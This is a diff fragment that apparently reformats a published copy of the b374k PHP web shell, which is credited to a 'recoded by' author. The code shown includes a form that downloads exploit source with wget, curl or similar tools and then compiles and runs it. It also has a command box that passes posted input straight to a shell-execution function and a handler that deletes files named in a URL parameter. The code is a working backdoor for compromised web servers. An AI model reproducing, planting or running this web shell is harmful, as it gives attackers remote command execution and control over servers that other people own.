$pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;cmd&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;<?php echo $msg; ?>&lt;/div&gt; 
+    <?php
+} elseif (isset($_GET['x']) && ($_GET['x'] == 'shell')) { ?> &lt;form action="?y=<?php echo $pwd; ?>&x=shell" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" readonly&gt; <?php if (isset($_POST['submitcmd'])) {
         echo @exe($_POST['cmd']);
-    } ?&gt; &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;?php echo $prompt; ?&gt; &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /&gt;&lt;input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:6%;" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;?php
+    } ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;<?php echo $prompt; ?> &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /&gt;&lt;input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:6%;" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
 } else {
     if (isset($_GET['delete']) && ($_GET['delete'] != "")) {
         $file = $_GET['delete'];
@@ -1099,9 +1099,9 @@ AddHandler cgi-script .izo";
     }
     $buff = showdir($pwd, $prompt);
     echo $buff;
-} ?&gt;
+} ?>
     
-    &lt;div class="info"&gt;:: b374k r3c0ded by &lt;span class="gaya"&gt;&lt;a href="http://facebook.com/K4C3.Undetected"&gt;&lt;?php echo $xName; ?&gt;&lt;/a&gt;&lt;/span&gt; ::&lt;/div&gt; 
-&lt;div class="jaya"&gt;  &copy; &lt;?php echo date("Y", time()) . " " . $xName; ?&gt;&lt;/div&gt; 
+    &lt;div class="info"&gt;:: b374k r3c0ded by &lt;span class="gaya"&gt;&lt;a href="http://facebook.com/K4C3.Undetected"&gt;<?php echo $xName; ?>&lt;/a&gt;&lt;/span&gt; ::&lt;/div&gt; 
+&lt;div class="jaya"&gt;  &copy; <?php echo date("Y", time()) . " " . $xName; ?>&lt;/div&gt; 
 &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;
-</pre>
+{% endhighlight %}
